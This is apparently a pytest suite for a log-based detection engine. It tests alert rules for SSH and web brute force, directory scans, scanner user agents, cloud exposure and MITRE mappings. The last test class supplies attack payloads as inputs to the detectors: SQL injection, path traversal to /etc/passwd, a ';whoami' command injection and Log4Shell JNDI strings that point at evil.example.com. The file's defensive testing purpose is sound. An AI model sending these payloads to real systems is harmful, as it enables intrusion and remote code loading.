import pytest
import yaml
from datetime import datetime, timezone

from app.models.schemas import AlertSeverity, Event, SourceType
from app.services.detection_engine import load_rules, run_detections


RULES_PATH = "app/rules/default_rules.yml"


def _linux_event(action: str, source_ip: str, username: str = "root", status: str = "failure") -> Event:
    return Event(
        event_id=f"ev-{action}-{source_ip[-3:]}",
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.linux_auth,
        source_host="web-01",
        source_ip=source_ip,
        username=username,
        action=action,
        status=status,
        raw_event={"line": f"test line for {action}"},
        normalized_message=f"{action} from {source_ip}",
    )


def _nginx_event(path: str, status: str, source_ip: str, user_agent: str = "Mozilla/5.0", idx: int = 0) -> Event:
    return Event(
        event_id=f"nginx-{source_ip[-3:]}-{idx}",
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.nginx_access,
        source_host="nginx",
        source_ip=source_ip,
        action="http_get",
        status=status,
        raw_event={"path": path, "method": "GET", "user_agent": user_agent},
        normalized_message=f"GET {path} {status} from {source_ip}",
    )


def _windows_event(event_code: str, host: str, source_ip: str | None, username: str = "admin", idx: int = 0, extra: dict | None = None) -> Event:
    action_map = {
        "4624": "logon_success",
        "4625": "logon_failure",
        "4720": "user_account_created",
        "4672": "special_privileges_assigned",
        "4688": "process_creation",
    }
    status = "success" if event_code not in ("4625",) else "failure"
    raw = {"event_code": event_code, "host": host, "username": username}
    if extra:
        raw.update(extra)
    return Event(
        event_id=f"win-{event_code}-{idx}",
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.windows_security,
        source_host=host,
        source_ip=source_ip,
        username=username,
        action=action_map.get(event_code, f"event_{event_code}"),
        status=status,
        raw_event=raw,
        normalized_message=f"Windows {event_code} by {username}",
    )


def _cloud_event(action: str, status: str, source_ip: str, username: str, extra: dict | None = None, idx: int = 0) -> Event:
    raw = {"action": action, "status": status, "username": username, "source_ip": source_ip}
    if extra:
        raw.update(extra)
    return Event(
        event_id=f"cloud-{action[:8]}-{idx}",
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.cloud_audit,
        source_host="us-east-1",
        source_ip=source_ip,
        username=username,
        action=action,
        status=status,
        raw_event=raw,
        normalized_message=f"Cloud {action} by {username}",
    )


class TestSSHBruteForce:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_below_threshold_no_alert(self, rules):
        events = [_linux_event("ssh_failed_password", "192.0.2.1") for _ in range(5)]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert len(brute) == 0

    def test_medium_threshold(self, rules):
        events = [
            Event(
                event_id=f"ev-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="192.0.2.10",
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed ssh",
            )
            for i in range(10)
        ]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert len(brute) == 1
        assert brute[0].severity == AlertSeverity.medium

    def test_high_threshold(self, rules):
        events = [
            Event(
                event_id=f"ev-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="192.0.2.20",
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed ssh",
            )
            for i in range(40)
        ]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert brute[0].severity == AlertSeverity.high

    def test_critical_threshold(self, rules):
        events = [
            Event(
                event_id=f"ev-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="192.0.2.30",
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed ssh",
            )
            for i in range(110)
        ]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert brute[0].severity == AlertSeverity.critical

    def test_alert_has_source_ip(self, rules):
        events = [
            Event(
                event_id=f"ev-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="192.0.2.40",
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed ssh",
            )
            for i in range(10)
        ]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert brute[0].source_ip == "192.0.2.40"

    def test_invalid_user_counted(self, rules):
        events = [
            Event(
                event_id=f"ev-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="192.0.2.50",
                username="test",
                action="ssh_invalid_user",
                status="failure",
                raw_event={},
                normalized_message="invalid user",
            )
            for i in range(10)
        ]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert len(brute) == 1


class TestSSHBruteForceSuccess:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_critical_alert_on_success_after_failures(self, rules):
        failed = [
            Event(
                event_id=f"fail-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="203.0.113.99",
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed",
            )
            for i in range(10)
        ]
        success = Event(
            event_id="success-1",
            timestamp=datetime.now(timezone.utc),
            source_type=SourceType.linux_auth,
            source_host="web-01",
            source_ip="203.0.113.99",
            username="root",
            action="ssh_accepted_password",
            status="success",
            raw_event={},
            normalized_message="accepted",
        )
        alerts = run_detections(failed + [success], rules)
        success_alerts = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE_SUCCESS"]
        assert len(success_alerts) == 1
        assert success_alerts[0].severity == AlertSeverity.critical

    def test_no_alert_without_failures(self, rules):
        success = Event(
            event_id="success-only",
            timestamp=datetime.now(timezone.utc),
            source_type=SourceType.linux_auth,
            source_host="web-01",
            source_ip="203.0.113.1",
            username="deploy",
            action="ssh_accepted_password",
            status="success",
            raw_event={},
            normalized_message="accepted",
        )
        alerts = run_detections([success], rules)
        success_alerts = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE_SUCCESS"]
        assert len(success_alerts) == 0


class TestWebDirScan:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_medium_scan(self, rules):
        events = [_nginx_event(f"/path{i}", "404", "192.0.2.200", idx=i) for i in range(35)]
        alerts = run_detections(events, rules)
        scan = [a for a in alerts if a.rule_id == "WEB_DIR_SCAN"]
        assert len(scan) == 1
        assert scan[0].severity == AlertSeverity.medium

    def test_high_scan(self, rules):
        events = [_nginx_event(f"/path{i}", "404", "192.0.2.201", idx=i) for i in range(85)]
        alerts = run_detections(events, rules)
        scan = [a for a in alerts if a.rule_id == "WEB_DIR_SCAN"]
        assert scan[0].severity == AlertSeverity.high

    def test_below_threshold_no_alert(self, rules):
        events = [_nginx_event(f"/path{i}", "404", "192.0.2.202", idx=i) for i in range(20)]
        alerts = run_detections(events, rules)
        scan = [a for a in alerts if a.rule_id == "WEB_DIR_SCAN"]
        assert len(scan) == 0


class TestSensitivePath:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_env_200_is_high(self, rules):
        events = [_nginx_event("/.env", "200", "203.0.113.50")]
        alerts = run_detections(events, rules)
        sensitive = [a for a in alerts if a.rule_id == "SENSITIVE_PATH_ACCESS"]
        assert len(sensitive) == 1
        assert sensitive[0].severity == AlertSeverity.high

    def test_git_403_is_medium(self, rules):
        events = [_nginx_event("/.git/HEAD", "403", "203.0.113.50")]
        alerts = run_detections(events, rules)
        sensitive = [a for a in alerts if a.rule_id == "SENSITIVE_PATH_ACCESS"]
        assert sensitive[0].severity == AlertSeverity.medium

    def test_admin_302_is_high(self, rules):
        events = [_nginx_event("/admin", "302", "203.0.113.50")]
        alerts = run_detections(events, rules)
        sensitive = [a for a in alerts if a.rule_id == "SENSITIVE_PATH_ACCESS"]
        assert sensitive[0].severity == AlertSeverity.high

    def test_normal_path_no_alert(self, rules):
        events = [_nginx_event("/index.html", "200", "203.0.113.5")]
        alerts = run_detections(events, rules)
        sensitive = [a for a in alerts if a.rule_id == "SENSITIVE_PATH_ACCESS"]
        assert len(sensitive) == 0


class TestSuspiciousUserAgent:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_sqlmap_detected(self, rules):
        events = [_nginx_event("/login", "200", "203.0.113.99", user_agent="sqlmap/1.7")]
        alerts = run_detections(events, rules)
        ua_alerts = [a for a in alerts if a.rule_id == "SUSPICIOUS_USER_AGENT"]
        assert len(ua_alerts) == 1

    def test_gobuster_detected(self, rules):
        events = [_nginx_event("/p1", "404", "198.51.100.77", user_agent="gobuster/3.6")]
        alerts = run_detections(events, rules)
        ua_alerts = [a for a in alerts if a.rule_id == "SUSPICIOUS_USER_AGENT"]
        assert len(ua_alerts) == 1

    def test_nikto_detected(self, rules):
        events = [_nginx_event("/backup", "404", "203.0.113.99", user_agent="nikto/2.1.6")]
        alerts = run_detections(events, rules)
        ua_alerts = [a for a in alerts if a.rule_id == "SUSPICIOUS_USER_AGENT"]
        assert len(ua_alerts) >= 1

    def test_normal_agent_no_alert(self, rules):
        events = [_nginx_event("/index", "200", "203.0.113.5", user_agent="Mozilla/5.0")]
        alerts = run_detections(events, rules)
        ua_alerts = [a for a in alerts if a.rule_id == "SUSPICIOUS_USER_AGENT"]
        assert len(ua_alerts) == 0


class TestWebAuthBruteForce:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_below_threshold_no_alert(self, rules):
        events = [_nginx_event("/login", "401", "198.51.100.5", idx=i) for i in range(4)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert len(wa) == 0

    def test_medium_threshold(self, rules):
        events = [_nginx_event("/login", "401", "198.51.100.6", idx=i) for i in range(5)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert len(wa) == 1
        assert wa[0].severity == AlertSeverity.medium

    def test_high_threshold(self, rules):
        events = [_nginx_event("/api/login", "401", "198.51.100.7", idx=i) for i in range(20)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert wa[0].severity == AlertSeverity.high

    def test_forbidden_status_counted(self, rules):
        events = [_nginx_event("/login", "403", "198.51.100.8", idx=i) for i in range(6)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert len(wa) == 1

    def test_non_login_path_no_alert(self, rules):
        events = [_nginx_event("/products", "401", "198.51.100.9", idx=i) for i in range(10)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert len(wa) == 0

    def test_successful_login_status_not_counted(self, rules):
        events = [_nginx_event("/login", "200", "198.51.100.10", idx=i) for i in range(10)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert len(wa) == 0

    def test_mitre_technique_is_t1110(self, rules):
        events = [_nginx_event("/login", "401", "198.51.100.11", idx=i) for i in range(6)]
        alerts = run_detections(events, rules)
        wa = [a for a in alerts if a.rule_id == "WEB_AUTH_BRUTE_FORCE"]
        assert wa[0].mitre_technique_id == "T1110"


class TestWindowsAccountCreation:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_account_created_after_failures(self, rules):
        failures = [_windows_event("4625", "WIN-SERVER01", "192.0.2.150", idx=i) for i in range(5)]
        creation = _windows_event("4720", "WIN-SERVER01", "192.0.2.150", extra={"new_account": "backdoor"})
        alerts = run_detections(failures + [creation], rules)
        win_alerts = [a for a in alerts if a.rule_id == "WIN_ACCOUNT_CREATED_AFTER_FAILURES"]
        assert len(win_alerts) == 1
        assert win_alerts[0].severity == AlertSeverity.high

    def test_no_alert_without_failures(self, rules):
        creation = _windows_event("4720", "WIN-SERVER02", None, extra={"new_account": "normal_user"})
        alerts = run_detections([creation], rules)
        win_alerts = [a for a in alerts if a.rule_id == "WIN_ACCOUNT_CREATED_AFTER_FAILURES"]
        assert len(win_alerts) == 0


class TestCloudSGOpen:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_ssh_open_is_high(self, rules):
        ev = _cloud_event(
            "security_group_rule_added", "success", "203.0.113.10", "devops@example.com",
            extra={"cidr": "0.0.0.0/0", "port": 22, "security_group_id": "sg-001", "protocol": "tcp"}
        )
        alerts = run_detections([ev], rules)
        sg_alerts = [a for a in alerts if a.rule_id == "CLOUD_SG_OPEN"]
        assert len(sg_alerts) == 1
        assert sg_alerts[0].severity == AlertSeverity.high

    def test_postgres_open_is_critical(self, rules):
        ev = _cloud_event(
            "security_group_rule_added", "success", "203.0.113.10", "devops@example.com",
            extra={"cidr": "0.0.0.0/0", "port": 5432, "security_group_id": "sg-002", "protocol": "tcp"}
        )
        alerts = run_detections([ev], rules)
        sg_alerts = [a for a in alerts if a.rule_id == "CLOUD_SG_OPEN"]
        assert sg_alerts[0].severity == AlertSeverity.critical

    def test_rdp_open_is_high(self, rules):
        ev = _cloud_event(
            "security_group_rule_added", "success", "203.0.113.10", "devops@example.com",
            extra={"cidr": "0.0.0.0/0", "port": 3389, "security_group_id": "sg-003", "protocol": "tcp"}
        )
        alerts = run_detections([ev], rules)
        sg_alerts = [a for a in alerts if a.rule_id == "CLOUD_SG_OPEN"]
        assert sg_alerts[0].severity == AlertSeverity.high

    def test_restricted_cidr_no_alert(self, rules):
        ev = _cloud_event(
            "security_group_rule_added", "success", "203.0.113.10", "devops@example.com",
            extra={"cidr": "10.0.0.0/8", "port": 22, "security_group_id": "sg-004", "protocol": "tcp"}
        )
        alerts = run_detections([ev], rules)
        sg_alerts = [a for a in alerts if a.rule_id == "CLOUD_SG_OPEN"]
        assert len(sg_alerts) == 0


class TestIAMChangeAfterFailure:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_iam_change_after_failure(self, rules):
        failure = _cloud_event("console_login", "failure", "198.51.100.30", "admin@example.com")
        iam_change = _cloud_event(
            "iam_policy_changed", "success", "198.51.100.30", "admin@example.com",
            extra={"policy_name": "AdminFullAccess", "change_type": "policy_attached", "target_user": "svc_01"},
            idx=1
        )
        alerts = run_detections([failure, iam_change], rules)
        iam_alerts = [a for a in alerts if a.rule_id == "CLOUD_IAM_CHANGE_AFTER_FAILURE"]
        assert len(iam_alerts) == 1
        assert iam_alerts[0].severity == AlertSeverity.high

    def test_no_alert_without_failure(self, rules):
        iam_change = _cloud_event(
            "iam_policy_changed", "success", "203.0.113.10", "devops@example.com",
            extra={"policy_name": "ReadOnly", "change_type": "policy_attached"},
        )
        alerts = run_detections([iam_change], rules)
        iam_alerts = [a for a in alerts if a.rule_id == "CLOUD_IAM_CHANGE_AFTER_FAILURE"]
        assert len(iam_alerts) == 0


class TestMultiSourceIP:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def test_multi_source_alert(self, rules):
        # Same IP appears in both linux_auth failures and nginx 404s
        shared_ip = "203.0.113.99"
        linux_events = [
            Event(
                event_id=f"linux-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip=shared_ip,
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed ssh",
            )
            for i in range(15)
        ]
        nginx_events = [_nginx_event(f"/p{i}", "404", shared_ip, idx=i) for i in range(35)]
        all_events = linux_events + nginx_events
        alerts = run_detections(all_events, rules)
        multi = [a for a in alerts if a.rule_id == "MULTI_SOURCE_SUSPICIOUS_IP"]
        assert len(multi) >= 1
        assert multi[0].severity == AlertSeverity.critical


class TestMitreMapping:
    MITRE_FIELDS = ("mitre_tactic", "mitre_technique_id", "mitre_technique_name", "mitre_mapping_confidence")

    def test_all_rules_have_mitre_mapping(self):
        with open(RULES_PATH, encoding="utf-8") as f:
            config = yaml.safe_load(f)
        for rule in config["rules"]:
            rid = rule.get("rule_id", "UNKNOWN")
            for field in self.MITRE_FIELDS:
                assert field in rule and rule[field], f"Rule {rid} missing {field}"

    def test_alert_contains_mitre_fields(self):
        rules = load_rules(RULES_PATH)
        events = [
            Event(
                event_id=f"ev-{i}",
                timestamp=datetime.now(timezone.utc),
                source_type=SourceType.linux_auth,
                source_host="web-01",
                source_ip="192.0.2.10",
                username="root",
                action="ssh_failed_password",
                status="failure",
                raw_event={},
                normalized_message="failed ssh",
            )
            for i in range(15)
        ]
        alerts = run_detections(events, rules)
        brute = [a for a in alerts if a.rule_id == "SSH_BRUTE_FORCE"]
        assert len(brute) == 1
        alert = brute[0]
        assert alert.mitre_tactic == "Credential Access"
        assert alert.mitre_technique_id == "T1110.001"
        assert alert.mitre_technique_name == "Brute Force: Password Guessing"
        assert alert.mitre_mapping_confidence == "direct"

    def test_win_account_rule_mitre_is_direct(self):
        rules = load_rules(RULES_PATH)
        rule = rules["WIN_ACCOUNT_CREATED_AFTER_FAILURES"]
        assert rule["mitre_mapping_confidence"] == "direct"
        assert rule["mitre_technique_id"] == "T1136.001"

    def test_approximate_rules_have_confidence_approximate(self):
        rules = load_rules(RULES_PATH)
        approximate_rule_ids = [
            "SSH_BRUTE_FORCE_SUCCESS",
            "WEB_DIR_SCAN",
            "SENSITIVE_PATH_ACCESS",
            "SUSPICIOUS_USER_AGENT",
            "CLOUD_SG_OPEN",
            "CLOUD_IAM_CHANGE_AFTER_FAILURE",
            "MULTI_SOURCE_SUSPICIOUS_IP",
        ]
        for rid in approximate_rule_ids:
            assert rules[rid]["mitre_mapping_confidence"] == "approximate", f"{rid} should be approximate"


class TestWebExploitDetection:
    @pytest.fixture
    def rules(self):
        return load_rules(RULES_PATH)

    def _alerts(self, path, rules, user_agent="Mozilla/5.0"):
        ev = _nginx_event(path, "200", "203.0.113.99", user_agent=user_agent)
        alerts = run_detections([ev], rules)
        return [a for a in alerts if a.rule_id == "WEB_EXPLOIT_ATTEMPT"]

    def test_sql_injection_encoded_is_detected(self, rules):
        # URL-encoded "' OR '1'='1" — must be decoded before matching
        web = self._alerts("/login?id=1%27%20OR%20%271%27%3D%271", rules)
        assert len(web) == 1
        assert "SQL Injection" in web[0].title

    def test_union_select_is_detected(self, rules):
        web = self._alerts("/users?id=1%20UNION%20SELECT%201,2,3--", rules)
        assert len(web) == 1
        assert "SQL Injection" in web[0].title

    def test_path_traversal_is_detected(self, rules):
        web = self._alerts("/download?file=../../../../etc/passwd", rules)
        assert len(web) == 1
        assert "Path Traversal" in web[0].title

    def test_command_injection_is_detected(self, rules):
        web = self._alerts("/ping?host=127.0.0.1;whoami", rules)
        assert len(web) == 1
        assert "Command Injection" in web[0].title

    def test_log4shell_in_path_is_detected(self, rules):
        web = self._alerts("/search?q=%24%7Bjndi:ldap://evil.example.com/a%7D", rules)
        assert len(web) == 1
        assert "Log4Shell" in web[0].title

    def test_log4shell_in_user_agent_is_detected(self, rules):
        web = self._alerts("/", rules, user_agent="${jndi:ldap://evil.example.com/x}")
        assert len(web) == 1
        assert "Log4Shell" in web[0].title

    def test_benign_request_not_flagged(self, rules):
        web = self._alerts("/products?id=42&sort=price", rules)
        assert len(web) == 0

    def test_mitre_technique_is_t1190(self, rules):
        web = self._alerts("/download?file=../../etc/passwd", rules)
        assert web[0].mitre_technique_id == "T1190"
        assert rules["WEB_EXPLOIT_ATTEMPT"]["mitre_mapping_confidence"] == "direct"
